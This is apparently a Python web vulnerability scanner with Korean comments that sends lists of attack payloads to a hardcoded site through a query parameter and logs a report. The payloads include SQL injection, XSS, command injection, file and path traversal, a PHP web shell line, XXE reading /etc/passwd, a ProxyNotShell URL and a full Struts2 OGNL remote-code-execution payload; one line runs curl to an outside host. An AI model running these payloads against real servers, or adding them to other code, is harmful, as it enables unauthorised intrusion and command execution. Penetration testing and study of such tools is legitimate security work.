import requests
import urllib.parse
import logging
from typing import List, Dict

# 타임라인 추가중
logging.basicConfig(level=logging.INFO, filename='scanner.log', filemode='w', 
                    format='%(asctime)s - %(levelname)s - %(message)s')

def define_payloads() -> Dict[str, List[str]]:
    """Define an array of POC payloads targeting common vulnerabilities."""
    payloads = {
        "SQL Injection": [
            "' OR '1'='1", 
            "' UNION SELECT NULL, NULL --", 
            """'; EXEC xp_cmdshell('whoami'); --"""
        ],
        "XSS": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "">"><script>alert('XSS')</script>"
        ],
        "Command Injection": [
            "; ls -la", 
            "| cat /etc/passwd", 
            "`whoami`"
        ],
        "File Inclusion": [
            "../../etc/passwd", 
            "../etc/shadow", 
            "/etc/hosts"
        ]
    }
    return payloads

def define_payloads_2() -> Dict[str, List[str]]:
    """Define a second set of POC payloads targeting additional vulnerabilities."""
    payloads_2 = {
        "Remote Code Execution (RCE)": [
            "$(id)", 
            "$(cat /etc/passwd)", 
            "`ls -la`", 
            "${IFS%??}curl${IFS%??}http://mirteam.kr"
        ],
        "Path Traversal": [
            "../../../../etc/passwd", 
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", 
            "/../../../../../../../../boot.ini"
        ],
        "Deserialization": [
            '{"name": "admin", "__proto__": {"toString": "function(){return `hacked`}"} }',
            "O:8:`Exploit`:0:{}",
            "<?php eval($_POST['cmd']); ?>"
        ],
        "CRLF Injection": [
            "%0d%0aHeader-Test: injected",
            "%0d%0aSet-Cookie: sessionid=malicious",
            "%0d%0a<script>alert('Injected')</script>"
        ],
        "XXE (XML External Entity)": [
            """<?xml version="1.0"?>
            <!DOCTYPE root [
                <!ENTITY test SYSTEM "file:///etc/passwd">
            ]>
            <root>&test;</root>""",
            """<?xml version="1.0"?>
            <!DOCTYPE test [
                <!ENTITY xxe SYSTEM "http://mirteam.kr">
            ]>
            <test>&xxe;</test>"""
        ]
    }
    return payloads_2

def define_payloads_3() -> Dict[str, List[str]]:
    """CVE-2022-41040 Proxy Not Shell and other CVE-specific payloads."""
    payloads_3 = {
        "Proxy Not Shell": [
            "/autodiscover/autodiscover.json?a@foo.var/owa/?&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell"
        ],
        "CVE-Specific Payloads": [
            """%{(#_='multipart/form-data')."""
            """(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."""
            """(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."""
            """(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."""
            """(#ognlUtil.getExcludedPackageNames().clear())."""
            """(#ognlUtil.getExcludedClasses().clear())."""
            """(#context.setMemberAccess(#dm))))."""
            """(#cmd='id')."""
            """(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."""
            """(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."""
            """(#p=new java.lang.ProcessBuilder(#cmds))."""
            """(#p.redirectErrorStream(true)).(#process=#p.start())."""
            """(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."""
            """(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."""
            """(#ros.flush())}"""
        ]
    }
    return payloads_3

# payloads 이전 host get set 완료
def send_get_request(url: str, params: Dict[str, str]) -> requests.Response:
    """Send a GET request with payloads injected into the query parameters."""
    try:
        response = requests.get(url, params=params, timeout=10)
        logging.info(f"Request URL: {response.url}")
        logging.info(f"Response Code: {response.status_code}")
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")
        return None
    
# 응답값 테스트중
def analyze_response(response: requests.Response, payload: str) -> bool:
    """Analyze server response for signs of vulnerability exploitation."""
    if response is None:
        return False
        #print response
    indicators = [
        "syntax error", "unexpected", "alert('XSS')", "root:x", "<title>500", "Command not found"
    ]

    for indicator in indicators:
        if indicator.lower() in response.text.lower():
            logging.info(f"Vulnerability detected with payload: {payload}")
            logging.info(f"Response snippet: {response.text[:200]}...")
            #print response
            #print indicator
            return True

    return False

# 로깅 >>>> 리포트 형식으로 출력
def generate_report(vulnerabilities: List[Dict[str, str]]) -> None:
    """Generate a structured report detailing identified vulnerabilities."""
    report = "Vulnerability Scan Report\n" + "="*30 + "\n\n"

    for vuln in vulnerabilities:
        report += f"URL: {vuln['url']}\n"
        report += f"Payload: {vuln['payload']}\n"
        report += f"Vulnerability Type: {vuln['type']}\n"
        report += f"Severity: {vuln['severity']}\n\n"
        #print vuln
        #print vulnerabilities

    with open('scan_report.txt', 'w') as f:
        f.write(report)
    logging.info("Report generated: scan_report.txt")

def main():
    """Main function to execute the scanning process."""
    target_url = "http://mirteam.kr"
    test_params = {"search": ""} 


    payloads = define_payloads()
    payloads_2 = define_payloads_2()
    payloads_3 = define_payloads_3()
    all_payloads = {**payloads, **payloads_2, **payloads_3}

    vulnerabilities = []

    for vuln_type, payload_list in all_payloads.items():
        for payload in payload_list:
            encoded_payload = urllib.parse.quote(str(payload))
            test_params["search"] = encoded_payload
            #print encoded_payload

            response = send_get_request(target_url, test_params)
            if analyze_response(response, payload):
                vulnerabilities.append({
                    "url": response.url,
                    "payload": payload,
                    "type": vuln_type,
                    "severity": "High"  #위험등급 나중에 추가 예정 (임시)
                })

    generate_report(vulnerabilities)

if __name__ == "__main__":
    main()
